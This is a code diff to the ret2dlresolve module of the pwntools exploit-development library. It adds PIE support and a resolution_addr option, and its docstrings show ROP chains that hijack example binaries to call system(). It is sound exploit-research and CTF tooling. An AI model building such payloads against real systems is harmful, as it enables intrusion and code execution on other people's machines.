@@ -32,9 +32,9 @@ We can automate the  process of exploitation with these some example binaries.
     0x0014:           0x2b84 [dlresolve index]
     0x0018:          b'gaaa' <return address>
     0x001c:        0x804ae24 arg0
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
-    >>> p.recvline()
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> p.recvline() # doctest: +LINUX
     b'pwned\n'
 
 You can also use ``Ret2dlresolve`` on AMD64:
@@ -46,26 +46,25 @@ You can also use ``Ret2dlresolve`` on AMD64:
     >>> rop.ret2dlresolve(dlresolve)
     >>> raw_rop = rop.chain()
     >>> print(rop.dump())
-    0x0000:         0x400593 pop rdi; ret
+    0x0000:         0x400593 read(0, 0x601e00), pop rdi; ret
     0x0008:              0x0 [arg0] rdi = 0
     0x0010:         0x400591 pop rsi; pop r15; ret
     0x0018:         0x601e00 [arg1] rsi = 6299136
-    0x0020:      b'iaaajaaa' <pad r15>
+    0x0020:      b'iaaajaaa' r15, <pad r15>
     0x0028:         0x4003f0 read
-    0x0030:         0x400593 pop rdi; ret
+    0x0030:         0x400593 [plt_init] system(0x601e48), pop rdi; ret
     0x0038:         0x601e48 [arg0] rdi = 6299208
     0x0040:         0x4003e0 [plt_init] system
     0x0048:          0x15670 [dlresolve index]
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
-    >>> if dlresolve.unreliable:
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> if dlresolve.unreliable: # doctest: +LINUX
     ...     p.poll(True) == -signal.SIGSEGV
     ... else:
     ...     p.recvline() == b'pwned\n'
     True
 """
 
-import six
 from copy import deepcopy
 
 from pwnlib.context import context
@@ -79,7 +78,7 @@ log = getLogger(__name__)
 ELF32_R_SYM_SHIFT = 8
 ELF64_R_SYM_SHIFT = 32
 
-class Elf32_Rel(object):
+class Elf32_Rel:
     ''
     """
     .. code-block:: c
@@ -101,7 +100,7 @@ class Elf32_Rel(object):
         return self.__flat__()
 
 
-class Elf64_Rel(object):
+class Elf64_Rel:
     ''
     """
     .. code-block:: c
@@ -123,7 +122,7 @@ class Elf64_Rel(object):
         return self.__flat__()
 
 
-class Elf32_Sym(object):
+class Elf32_Sym:
     ''
     """
     .. code-block:: c
@@ -158,7 +157,7 @@ class Elf32_Sym(object):
         return self.__flat__()
 
 
-class Elf64_Sym(object):
+class Elf64_Sym:
     ''
     """
     .. code-block:: c
@@ -212,18 +211,31 @@ class MarkedBytes(bytes):
     pass
 
 
-class Ret2dlresolvePayload(object):
+class Ret2dlresolvePayload:
     """Create a ret2dlresolve payload
 
     Arguments:
         elf (ELF): Binary to search
         symbol (str): Function to search for
         args (list): List of arguments to pass to the function
+        data_addr (int|None): The address where the payload will 
+            be written to. If not provided, a suitable address will
+            be chosen automatically (recommended).
+        resolution_addr (int|None): The address where the location
+            of the resolved symbol will be written to. If not provided
+            will be equal to data_addr.
 
     Returns:
-        A ``Ret2dlresolvePayload`` object which can be passed to ``rop.ret2dlresolve``
+        A ``Ret2dlresolvePayload`` object. It can be passed to ``rop.ret2dlresolve``
+        for automatic exploitation.
+
+        If that is not suitable the object generates useful values (.reloc_index 
+        and .payload) which can be used to aid manual exploitation. In this case
+        it is recommended to set .resolution_addr to the GOT address of an easily
+        callable function (do not set it when passing the object to 
+        rop.ret2dlresolve).
     """
-    def __init__(self, elf, symbol, args, data_addr=None):
+    def __init__(self, elf, symbol, args, data_addr=None, resolution_addr=None):
         self.elf = elf
         self.elf_load_address_fixup = self.elf.address - self.elf.load_addr
         self.strtab = elf.dynamic_value_by_tag("DT_STRTAB") + self.elf_load_address_fixup
@@ -236,6 +248,7 @@ class Ret2dlresolvePayload(object):
         self.unreliable = False
 
         self.data_addr = data_addr if data_addr is not None else self._get_recommended_address()
+        self.resolution_addr = resolution_addr if resolution_addr is not None else self.data_addr
 
         # Will be set when built
         self.reloc_index = -1
@@ -302,8 +315,12 @@ class Ret2dlresolvePayload(object):
         # ElfRel
         rel_addr = self.jmprel + self.reloc_index * ElfRel.size
         rel_type = 7
-        rel = ElfRel(r_offset=self.data_addr, r_info=(index<<ELF_R_SYM_SHIFT)+rel_type)
-
+        rel = ElfRel(r_offset=self.resolution_addr, r_info=(index<<ELF_R_SYM_SHIFT)+rel_type)
+        
+        # When a program's PIE is enabled, r_offset should be the relative address, not the absolute address
+        if self.elf.pie:
+            rel = ElfRel(r_offset=self.resolution_addr - (self.elf.load_addr + self.elf_load_address_fixup), r_info=(index<<ELF_R_SYM_SHIFT)+rel_type)
+        
         self.payload = fit({
             symbol_name_addr - self.data_addr: symbol_name,
             sym_addr - self.data_addr: sym,
@@ -312,15 +329,16 @@ class Ret2dlresolvePayload(object):
 
         ver_addr = self.versym + 2 * index # Elf_HalfWord
 
-        log.debug("Symtab: %s", hex(self.symtab))
-        log.debug("Strtab: %s", hex(self.strtab))
-        log.debug("Versym: %s", hex(self.versym))
-        log.debug("Jmprel: %s", hex(self.jmprel))
-        log.debug("ElfSym addr: %s", hex(sym_addr))
-        log.debug("ElfRel addr: %s", hex(rel_addr))
-        log.debug("Symbol name addr: %s", hex(symbol_name_addr))
-        log.debug("Version index addr: %s", hex(ver_addr))
-        log.debug("Data addr: %s", hex(self.data_addr))
+        log.debug("Symtab: %#x", self.symtab)
+        log.debug("Strtab: %#x", self.strtab)
+        log.debug("Versym: %#x", self.versym)
+        log.debug("Jmprel: %#x", self.jmprel)
+        log.debug("ElfSym addr: %#x", sym_addr)
+        log.debug("ElfRel addr: %#x", rel_addr)
+        log.debug("Symbol name addr: %#x", symbol_name_addr)
+        log.debug("Version index addr: %#x", ver_addr)
+        log.debug("Data addr: %#x", self.data_addr)
+        log.debug("Resolution addr: %#x", self.resolution_addr)
         if not self.elf.memory[ver_addr]:
             log.warn("Ret2dlresolve is likely impossible in this ELF "
                      "(too big gap between text and writable sections).\n"
@@ -358,7 +376,7 @@ class Ret2dlresolvePayload(object):
             elif isinstance(top, bytes):
                 top = pack(self.data_addr + len(self.payload) + queue.size())
                 queue.append(MarkedBytes(queue[0]))
-            elif isinstance(top, six.integer_types):
+            elif isinstance(top, int):
                 top = pack(top)
 
             self.payload += top
